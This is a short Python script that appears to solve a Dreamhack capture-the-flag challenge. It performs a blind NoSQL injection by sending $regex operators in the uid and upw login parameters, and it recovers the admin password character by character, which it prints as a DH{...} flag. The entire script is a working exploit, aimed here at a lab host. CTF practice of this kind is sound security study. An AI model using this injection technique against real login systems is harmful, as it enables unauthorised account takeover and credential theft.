import requests

menu="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

result=''
for i in range(32):
    for ch in menu:
        query=f"http://host3.dreamhack.games:10182/login?uid[$regex]=^adm&upw[$regex]=^D.{{{result}{ch}"#{가 나오게 하려면 {를 두개쓰면 됨
        response=requests.get(query)
        if "admin" in response.text:
            result=result+ch
            break
        print("DH{"+result+"}")
print("DH{"+result+"}")
    



